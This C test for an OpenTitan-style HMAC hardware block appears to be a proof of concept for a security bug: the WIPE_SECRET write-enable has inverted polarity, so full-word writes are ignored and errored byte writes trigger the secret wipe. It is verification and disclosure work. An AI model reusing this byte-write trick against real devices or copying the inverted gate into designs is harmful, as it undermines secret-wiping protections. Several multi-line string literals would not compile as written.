#include "sw/device/lib/base/abs_mmio.h"
#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"

#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "hmac_regs.h"

OTTF_DEFINE_TEST_CONFIG();

// This POC demonstrates that the HMAC WIPE_SECRET CSR write-enable is gated
// with reg_error instead of !reg_error (inverted polarity). As a result,
// full-word writes to the WIPE_SECRET register are ignored during normal
// operation (reg_error == 0), while sub-word/byte writes that generate a
// write error (wr_err -> reg_error == 1) actually enable the WIPE_SECRET
// write due to the inverted gating.

static void read_digest_words(mmio_region_t base, uint32_t out[8]) {
  for (int i = 0; i < 8; ++i) {
    out[i] = mmio_region_read32(base, HMAC_DIGEST_0_OFFSET + i * 4);
  }
}

bool test_main(void) {
  LOG_INFO("HMAC WIPE_SECRET inverted polarity POC test (vuln id 39)");

  mmio_region_t base = mmio_region_from_addr(TOP_EARLGREY_HMAC_BASE_ADDR);

  // Choose a distinctive wipe value that is unlikely to appear by chance.
  const uint32_t kWipeValue = 0xDEADBEEF;

  uint32_t before[8];
  read_digest_words(base, before);

  LOG_INFO("Digest[0] before wipe attempt: 0x%08x", before[0]);

  // 1) Attempt a normal full 32-bit write to WIPE_SECRET.
  // Under correct behavior this should trigger a secure wipe and update the
  // digest registers to kWipeValue. Because of the bug (inverted polarity)
  // the full-word write will be blocked and have no effect.
  abs_mmio_write32(TOP_EARLGREY_HMAC_BASE_ADDR + HMAC_WIPE_SECRET_OFFSET,
                   kWipeValue);

  uint32_t after_full[8];
  read_digest_words(base, after_full);

  LOG_INFO("Digest[0] after full 32-bit write: 0x%08x", after_full[0]);

  // We expect that, due to the bug, the full write did NOT apply the wipe.
  // Make this an explicit CHECK so the test fails if the hardware behaved
  // correctly (i.e., if the write actually succeeded) — this simplifies
  // automated triage.
  CHECK(after_full[0] != kWipeValue,
        "Full 32-bit write to WIPE_SECRET unexpectedly succeeded; test is
        intended to demonstrate the vulnerability (inverted polarity)."
        );

  // 2) Now perform byte-wise writes to the same WIPE_SECRET register. Byte
  // writes set the bus byte-enable accordingly; the register's sub-word
  // write checking logic will detect a sub-word access and assert wr_err,
  // which sets reg_error = 1 for that transaction. Because the faulty
  // write-enable uses reg_error (not !reg_error) the WIPE_SECRET write will
  // be enabled only when reg_error==1, so these byte writes will trigger the
  // wipe.
  uint8_t b = (uint8_t)(kWipeValue & 0xFF);
  uintptr_t base_addr = TOP_EARLGREY_HMAC_BASE_ADDR + HMAC_WIPE_SECRET_OFFSET;

  // Write the 4 bytes of kWipeValue in little-endian order. Each write is a
  // separate transaction and should assert wr_err (sub-word write), which
  // in turn enables the WIPE_SECRET write because of the inverted gating.
  for (int i = 0; i < 4; ++i) {
    abs_mmio_write8((uint32_t)(base_addr + i), b);
  }

  uint32_t after_bytes[8];
  read_digest_words(base, after_bytes);

  LOG_INFO("Digest[0] after byte-wise writes: 0x%08x", after_bytes[0]);

  // The vulnerable hardware permits the wipe only in the errored transaction
  // path. Therefore we expect the byte-wise sequence to have applied the
  // wipe and set the digest words to kWipeValue. If the hardware already had
  // the correct behavior this check will fail (but the test above already
  // covers that case).
  CHECK(after_bytes[0] == kWipeValue,
        "Byte-wise writes did not trigger WIPE_SECRET effect as expected; the
         hardware may not have the documented bug or the test assumptions
         about write-behavior are incorrect.");

  // Additional checks: ensure all digest words were updated to the wipe value
  for (int i = 0; i < 8; ++i) {
    CHECK(after_bytes[i] == kWipeValue,
          "Digest[%d] expected 0x%08x, got 0x%08x", i, kWipeValue,
          after_bytes[i]);
  }

  LOG_INFO("VULN-39 POC: full write blocked, byte writes caused wipe as
           expected (inverted polarity confirmed)");

  return true;
}
